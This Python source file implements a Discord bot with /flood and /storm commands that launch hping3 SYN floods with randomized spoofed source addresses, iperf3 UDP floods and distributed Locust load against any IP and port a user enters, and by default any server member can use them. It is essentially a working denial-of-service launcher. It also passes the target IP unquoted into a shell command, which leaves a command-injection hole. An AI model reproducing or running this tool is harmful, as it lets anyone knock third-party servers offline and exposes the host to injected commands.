import os
import asyncio
import shlex
from typing import Literal
import subprocess

import discord
from discord import app_commands
from discord.ext import commands

# ─── Configuration ──────────────────────────────────────────────────────────────
BOT_TOKEN       = os.getenv("DISCORD_TOKEN")
ALLOWED_ROLE_ID = int(os.getenv("FLOODER_ROLE_ID", "0"))  # 0 = open to all

# Defaults for /flood
DEFAULT_TCP_DUR    = 5      # seconds
DEFAULT_UDP_BW     = "1G"
DEFAULT_UDP_DUR    = 5      # seconds

# Defaults for /storm
DEFAULT_USERS      = 200
DEFAULT_SPAWN_RATE = 20
DEFAULT_RUN_TIME   = "2m"
DEFAULT_WORKERS    = 4
# ────────────────────────────────────────────────────────────────────────────────

class FloodBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.none())
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        self.tree.add_command(flood)
        self.tree.add_command(storm)
        await self.tree.sync()

bot = FloodBot()

def has_flood_role(interaction: discord.Interaction) -> bool:
    if ALLOWED_ROLE_ID == 0:
        return True
    return any(r.id == ALLOWED_ROLE_ID for r in interaction.user.roles)

async def run_subprocess(cmd: str, timeout: float) -> tuple[int, str]:
    proc = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    await asyncio.sleep(timeout)
    proc.terminate()
    try:
        await proc.wait()
    except:
        proc.kill()
    _, err = await proc.communicate()
    return proc.returncode, err.decode().strip()

@bot.tree.command(name="flood", description="Quick TCP/UDP flood via hping3 or iperf3")
@app_commands.describe(
    tool="Which tool to use: hping3 or iperf3",
    ip="Target IPv4",
    port="Port number",
    bw="(iperf3) bandwidth, e.g. 100M,1G",
    dur="Duration in seconds",
)
async def flood(
    interaction: discord.Interaction,
    tool: Literal["hping3", "iperf3"],
    ip: str,
    port: int,
    bw: str | None = None,
    dur: int | None = None,
):
    if not has_flood_role(interaction):
        return await interaction.response.send_message("🚫 No permission.", ephemeral=True)

    await interaction.response.defer(thinking=True)

    if tool == "hping3":
        dur = dur or DEFAULT_TCP_DUR
        cmd = f"hping3 --flood --rand-source -S -p {port} {ip}"
        desc = f"SYN flood: `{ip}:{port}` for ~{dur}s"
    else:
        bw  = bw  or DEFAULT_UDP_BW
        dur = dur or DEFAULT_UDP_DUR
        cmd = f"iperf3 -c {ip} -u -b {bw} -t {dur} -p {port} -y C"
        desc = f"UDP flood: `{ip}:{port}` @ {bw} for {dur}s"

    code, stderr = await run_subprocess(cmd, timeout=(dur or 5) + 1)
    if code == 0:
        await interaction.followup.send(f"✅ `{tool}` completed: {desc}")
    else:
        await interaction.followup.send(f"⚠️ `{tool}` exited {code}\n```{stderr}```")

@bot.tree.command(name="storm", description="Launch distributed storm via Locust + C-tools")
@app_commands.describe(
    ip="Target IPv4 for both TCP/UDP",
    tcp_port="TCP port for hping3",
    udp_port="UDP port for iperf3",
    users="Total virtual users",
    spawn_rate="Spawn rate (users/sec)",
    run_time="Run time (e.g. 2m,30s)",
    workers="Number of Locust worker processes",
)
async def storm(
    interaction: discord.Interaction,
    ip: str,
    tcp_port: int,
    udp_port: int,
    users: int | None     = None,
    spawn_rate: int | None= None,
    run_time: str | None  = None,
    workers: int | None   = None,
):
    if not has_flood_role(interaction):
        return await interaction.response.send_message("🚫 No permission.", ephemeral=True)

    users      = users      or DEFAULT_USERS
    spawn_rate = spawn_rate or DEFAULT_SPAWN_RATE
    run_time   = run_time   or DEFAULT_RUN_TIME
    workers    = workers    or DEFAULT_WORKERS

    await interaction.response.defer(thinking=True)

    # set env for locustfile_tools.py
    envp = (
        f"LOCUST_TARGET_IP={shlex.quote(ip)} "
        f"LOCUST_TCP_PORT={tcp_port} "
        f"LOCUST_UDP_PORT={udp_port} "
        f"LOCUST_UDP_BW={shlex.quote(DEFAULT_UDP_BW)}"
    )

    # 1) master
    master_cmd = (
        f"{envp} locust -f locustfile_tools.py "
        f"--master --expect-workers {workers} --headless "
        f"--users {users} --spawn-rate {spawn_rate} --run-time {run_time}"
    )
    master = await asyncio.create_subprocess_shell(master_cmd)
    await asyncio.sleep(5)

    # 2) workers
    for _ in range(workers):
        await asyncio.create_subprocess_shell(
            f"{envp} locust -f locustfile_tools.py --worker --master-host=127.0.0.1"
        )

    code = await master.wait()
    if code == 0:
        await interaction.followup.send(
            f"🔥 Storm finished: {users} users @ {spawn_rate}/s for {run_time}, "
            f"TCP→{ip}:{tcp_port}, UDP→{ip}:{udp_port}, workers={workers}"
        )
    else:
        await interaction.followup.send(f"⚠️ Storm failed (exit code {code}).")

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
